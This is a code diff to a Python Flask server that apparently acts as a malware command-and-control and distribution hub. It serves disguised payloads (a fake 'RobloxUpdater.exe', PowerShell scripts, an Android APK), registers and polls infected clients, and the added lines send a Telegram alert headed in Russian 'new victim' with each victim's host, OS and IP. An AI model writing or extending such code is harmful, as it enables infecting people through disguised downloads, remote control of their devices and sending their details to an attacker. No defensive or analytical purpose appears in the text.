@@ -1,10 +1,27 @@
 # language: Python 3.11+, file: app.py, target: Render
 from flask import Flask, send_file, Response, request, jsonify
 import base64, datetime, time, uuid, threading, json
+import urllib.request
 
 app = Flask(__name__)
 PAYLOAD_EXE = "RobloxUpdater.exe"
 PAYLOAD_PS1 = "payload.ps1"
+PAYLOAD_APK = "NexusAndroid.apk"
+
+# ====== TELEGRAM УВЕДОМЛЕНИЯ ======
+TG_TOKEN = "ВСТАВЬ_ТОКЕН"
+TG_CHAT  = "ВСТАВЬ_CHAT_ID"
+
+def tg_notify(text):
+    try:
+        url = f"https://api.telegram.org/bot{TG_TOKEN}/sendMessage"
+        data = json.dumps({"chat_id": TG_CHAT, "text": text[:4000]}).encode()
+        req = urllib.request.Request(url, data=data,
+                                     headers={"Content-Type": "application/json"})
+        urllib.request.urlopen(req, timeout=10)
+    except Exception:
+        pass
+# ===================================
 
 lock = threading.Lock()
 clients = {}
@@ -26,13 +43,6 @@ def payload():
         data = f.read()
     return Response(base64.b64encode(data), mimetype="text/plain")
 
-@app.route("/fallback")
-def fallback():
-    log_hit(request.remote_addr, request.headers.get("User-Agent",""), "/fallback")
-    with open(PAYLOAD_EXE, "rb") as f:
-        data = f.read()
-    return Response(base64.b64encode(data), mimetype="text/plain")
-
 @app.route("/payload.ps1")
 def ps1():
     log_hit(request.remote_addr, request.headers.get("User-Agent",""), "/payload.ps1")
@@ -42,6 +52,14 @@ def ps1():
 def raw_exe():
     log_hit(request.remote_addr, request.headers.get("User-Agent",""), "/raw_exe")
     return send_file(PAYLOAD_EXE, mimetype="application/octet-stream")
+
+@app.route("/android")
+def android_download():
+    log_hit(request.remote_addr, request.headers.get("User-Agent",""), "/android")
+    try:
+        return send_file(PAYLOAD_APK, mimetype="application/vnd.android.package-archive")
+    except Exception:
+        return "APK not uploaded yet", 404
 
 @app.route("/run.ps1")
 def run_ps1():
@@ -71,6 +89,7 @@ def register():
             "results": [],
         }
     print(f"[+] register {cid} | {hostname} | {request.remote_addr}")
+    tg_notify(f"🎯 НОВАЯ ЖЕРТВА\nID: {cid}\nHost: {hostname}\nOS: {os_info}\nIP: {request.remote_addr}\nВремя: {datetime.datetime.now().strftime('%H:%M:%S')}")
     return jsonify({"cid": cid})
 
 @app.route("/poll", methods=["POST"])
@@ -128,6 +147,14 @@ def list_clients():
                 "last_seen": int(now - c["last_seen"]),
             })
     return jsonify(out)
+
+@app.route("/client/<cid>", methods=["DELETE"])
+def delete_client(cid):
+    with lock:
+        if cid in clients:
+            del clients[cid]
+            return jsonify({"status": "deleted"})
+    return jsonify({"status": "not found"}), 404
 
 @app.route("/results/<cid>")
 def get_results(cid):
